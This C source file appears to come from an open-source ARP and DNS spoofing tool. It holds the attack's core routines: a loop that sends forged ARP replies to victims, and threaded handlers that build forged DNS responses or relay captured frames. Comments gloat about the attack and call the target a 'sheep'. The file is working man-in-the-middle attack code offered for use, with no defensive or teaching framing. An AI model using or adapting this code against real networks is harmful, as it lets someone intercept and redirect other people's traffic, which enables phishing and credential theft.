/*
 *                              Copyright (C) 2014 by Rafael Santiago
 *
 * This is free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include "netbots.h"
#include "types.h"
#include "ctxs.h"
#include "arpspf.h"
#include "if.h"
#include "arpspf.h"
#include "dnsspf.h"
#include "mem.h"
#include "sockio.h"
#include "watchdogs.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h>

static pthread_mutex_t reqhandler_mtx = PTHREAD_MUTEX_INITIALIZER;

struct dnsf_ckr_request_handler_args {
    dnsf_ckr_realdnstransactions_ctx **transactions;
    dnsf_ckr_fakenameserver_ctx **fakeserver;
    dnsf_ckr_dnsresolvcache_ctx **dnscache;
    dnsf_ckr_sockio_data_ctx *packet;
    int dnsspf_ttl;
};

struct dnsf_ckr_request_handlers {
    int busy;
    dnsf_ckr_thread handler;
    pthread_attr_t handler_attr;
    struct dnsf_ckr_request_handler_args args;
};

static struct dnsf_ckr_request_handlers g_dnsf_ckr_request_handler[DNSF_CKR_REQ_HANDLERS_NR];

static struct dnsf_ckr_request_handlers *dnsf_ckr_get_free_request_handler(const int max_handlers);

static void *dnsf_ckr_request_handler_routine(void *handler);

void *dnsf_ckr_arp_spoofing_bot_routine(void *vargs) {
    struct dnsf_ckr_bot_routine_ctx *args = (struct dnsf_ckr_bot_routine_ctx *)vargs;
    dnsf_ckr_realdnstransactions_ctx *transactions = (dnsf_ckr_realdnstransactions_ctx *)args->arg[0];
    dnsf_ckr_realdnstransactions_ctx *tp;
    char *lo_mac = dnsf_ckr_get_iface_mac((char *)args->arg[1]);
    int sent_nr = *(int *)args->arg[2];
    char spf_ip[0xff], dest_ip[0xff];
    struct in_addr src_in, dest_in;
    while (!dnsf_ckr_should_abort()) {
        for (tp = transactions; tp; tp = tp->next) {
            src_in.s_addr = tp->sends_reqs_to->addr;
            dest_in.s_addr = tp->victim->addr;
            sprintf(spf_ip, "%s", inet_ntoa(src_in));
            sprintf(dest_ip, "%s", inet_ntoa(dest_in));
            dnsf_ckr_spoof_mac(lo_mac, spf_ip, tp->victim->hw_addr, dest_ip, sent_nr, 100);
            usleep(1);
        }
    }
    free(lo_mac);
    return NULL;
}

static void *dnsf_ckr_request_handler_routine(void *handler) {
    struct dnsf_ckr_request_handlers *hp = (struct dnsf_ckr_request_handlers *) handler;
    struct dnsf_ckr_request_handler_args *args = ((struct dnsf_ckr_request_handler_args *) &hp->args);
    dnsf_ckr_sockio_data_ctx *p = args->packet;
    unsigned char *rawpkt = NULL;
    unsigned char src_mac[6];
    char domain_name[0xff];
    dnsf_ckr_victims_ctx *victim = NULL;
    dnsf_ckr_hostnames_ctx *hostinfo = NULL;
    size_t rawpktsz;
    dnsf_ckr_action_t action;
    struct in_addr spf_addr;
    if (p != NULL && p->dsize > 14) {
        action = dnsf_ckr_action_none;
        //  ok people, all nasty goes from here...
        if (*(p->data + 12) == 0x08 && *(p->data + 13) == 0x00) {
            memcpy(src_mac, p->data, sizeof(src_mac));
            rawpkt = NULL;
            victim = NULL;
            hostinfo = NULL;
            action = dnsf_ckr_proc_ip_packet(p->data + 14,
                                             p->dsize - 14,
                                             &rawpkt,
                                             &rawpktsz,
                                             *args->transactions,
                                             *args->fakeserver,
                                             src_mac,
                                             domain_name,
                                             sizeof(domain_name),
                                             &victim,
                                             &hostinfo,
                                             args->dnsspf_ttl,
                                             args->dnscache,
                                             255);
        } else {
            //  for performance reasons we won't try to handle other ether types than IP.
            //continue;
        }
        switch (action) {
            case dnsf_ckr_action_repass: //  here we only will repass and the layer-1 will be already corrected.
                //  INFO(Santiago): don't touch... just echoing to the victim's machine what we grabbed..
                //  ..but first we need to correct the ethernet frame.
                action = dnsf_ckr_proc_eth_frame(p->data, p->dsize, &rawpkt, &rawpktsz, *args->transactions);
                /*if (action == dnsf_ckr_action_none) {
                    rawpkt = p->data;
                    rawpktsz = p->dsize;
                }*/
                break;
            case dnsf_ckr_action_spoof:
                //  INFO(Santiago): the dns reply was already assembled by dnsf_ckr_proc_ip_packet() call and now all we need to do
                //  is to repass it to the computer's victim which is believing that we are the DNS server..
                if (hostinfo != NULL) {
                    spf_addr.s_addr = hostinfo->addr;
                    printf("dnsf_ckr INFO: spoof attempt <%s:%s> to \"%s\" done.\n", domain_name, inet_ntoa(spf_addr), victim->name);
                } else {
                    printf("dnsf_ckr INFO: echoing <%s> resolution to \"%s\".\n", domain_name, victim->name);
                }
                break;
            default:
                //  INFO(Santiago): even with ethernet frame layer-3 protocol being not equals to 0x0800 (IP)
                //  in some cases we need to correct the ethernet frame MAC destination field and then repass
                //  it to the "sheep" computer (a.k.a. your friend [in troll environments]).
                action = dnsf_ckr_proc_eth_frame(p->data, p->dsize, &rawpkt, &rawpktsz, *args->transactions);
                break;
        }
        if (rawpkt != NULL) {
            dnsf_ckr_sock_write(rawpkt, rawpktsz); //  ..MuHauHauAHuahAUhUahUAhAUHAUHh! :)
            if (rawpkt != p->data) {
                free(rawpkt);
            }
            rawpkt = NULL;
        }
        p->next = NULL;
        del_dnsf_ckr_sockio_data_ctx(p);
    }
    hp->busy = 0;
    return NULL;
}

static struct dnsf_ckr_request_handlers *dnsf_ckr_get_free_request_handler(const int max_handlers) {
    size_t h;
    struct dnsf_ckr_request_handlers *hp = NULL;
    pthread_mutex_lock(&reqhandler_mtx);
    for (h = 0; hp == NULL && h < max_handlers; h++) {
        if (!g_dnsf_ckr_request_handler[h].busy) {
            hp = &g_dnsf_ckr_request_handler[h];
        }
    }
    hp->busy = 1;
    pthread_mutex_unlock(&reqhandler_mtx);
    return hp;
}

void *dnsf_ckr_fakeserver_bot_routine(void *vargs) {
    struct dnsf_ckr_bot_routine_ctx *args = (struct dnsf_ckr_bot_routine_ctx *)vargs;
    dnsf_ckr_realdnstransactions_ctx *transactions = (dnsf_ckr_realdnstransactions_ctx *)args->arg[0];
    dnsf_ckr_fakenameserver_ctx *fakeserver = (dnsf_ckr_fakenameserver_ctx *)args->arg[1];
    dnsf_ckr_sockio_data_ctx *packets = NULL, *p;
    dnsf_ckr_dnsresolvcache_ctx *dnscache = NULL;
    int dnsspf_ttl = *(int *)args->arg[2];
    int reqhandlers_nr = *(int *)args->arg[3];
    struct dnsf_ckr_request_handlers *hp = NULL;
    size_t h;
    for (h = 0; h < DNSF_CKR_REQ_HANDLERS_NR; h++) {
        g_dnsf_ckr_request_handler[h].busy = 0;
    }
    while (!dnsf_ckr_should_abort()) {
        packets = dnsf_ckr_sock_read();
        for (p = packets; p; p = p->next) {
            while((hp = dnsf_ckr_get_free_request_handler(reqhandlers_nr)) == NULL) {
                usleep(1);
            }
            hp->args.transactions = &transactions;
            hp->args.fakeserver = &fakeserver;
            hp->args.dnscache = &dnscache;
            hp->args.packet = p;
            hp->args.dnsspf_ttl = dnsspf_ttl;
            pthread_attr_init(&hp->handler_attr);
            pthread_create(&hp->handler, &hp->handler_attr, dnsf_ckr_request_handler_routine, hp);
        }
        usleep(1);
    }
    for (h = 0; h < DNSF_CKR_REQ_HANDLERS_NR; h++) {
        if (g_dnsf_ckr_request_handler[h].busy) {
            pthread_join(g_dnsf_ckr_request_handler[h].handler, NULL);
        }
    }
    del_dnsf_ckr_dnsresolvcache_ctx(dnscache);
    return NULL;
}
